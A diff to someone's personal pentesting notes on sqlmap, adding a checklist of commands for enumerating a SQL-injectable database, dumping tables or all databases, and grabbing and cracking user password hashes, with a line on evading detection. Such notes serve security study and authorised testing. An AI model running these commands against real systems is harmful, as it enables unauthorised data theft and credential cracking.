@@ -46,6 +46,27 @@ sqlmap -hh # Advanced options
 ```
 > A useful trick is to take a HTTP request from a browser, `copy as cURL` and then paste that directly into `sqlmap` as it takes the same format.
 > It can also use a request file using `-r [filename]` so we can save requests as files from [[Burp Suite]] and then use them with `sqlmap`.
+
+### Basic Checklist
+Basic enumeration:
+```bash
+sqlmap -u "..." --banner --current-user --current-db --is-dba
+```
+Table enumeration:
+```bash
+sqlmap -u "..." --tables -D [db]
+```
+Dump useful tables:
+> We can also specify `-C [cols]` if we know them for larger tables so we don't have loads of data
+```bash
+sqlmap -u "..." --dump -T [table] -D [db]
+```
+Full DB enumeration (heavyweight):
+```bash
+sqlmap -u "..." --dump -D [db]
+```
+> `--dump-all --exclude-sysbs` can be used to dump all databases in the entire system
+
 ### GET Parameters
 ```bash
 sqlmap -u "https://example.com/index.php?id=1" --batch
@@ -60,7 +81,24 @@ sqlmap -u "https://example.com/login.php" --data 'username=test&password=*'
 > We can also specify a particular parameter with `-p username`
 
 ### Extracting Data
-The `--dump` flag will attempt to exfiltrate content out from the specified data after an SQLi mechanism has been discovered
+The `--dump` flag will attempt to exfiltrate content out from the specified data after an SQLi mechanism has been discovered. Some useful basic data enumeration:
+- `--hostname` : machine hostname
+- `--current-user`
+- `--current-db`
+- `--passwords` : gets password hashses
+- `--banner`
+- `--is-dba` : is the current user have DBA rights
+- `--tables` : enumerate table names
+- `--where` : allows us to add a where clause so we can filter the results returned
+- `--schema` : extracts database schema
+- `--search` : this can be followed with `-T [table]` or `-C [col]` to search the DB for anything that matches (eg. `--search -C pass` - will return anything with `pass` in the name - not case sensitive)
+A good initial enumeration command:
+```bash
+sqlmap -u "..." --banner --current-user --current-db --is-dba
+```
+
+### Password Cracking
+SQLMap automatically searches for anything that resembles a hash and automatically attempts to crack them with its internal engine. It supports a plethora of hash algorithms and an internal dictionary of millions of passwords. The `--passwords` flag is a shortcut for grabbing the DB users' password hashses and cracking them.
 
 ### Avoiding Detection
 The `--random-agent` will change the `user-agent` header to use a regular browser value (*it picks from an internal database at random*). The `--mobile` simulates a mobile browser.
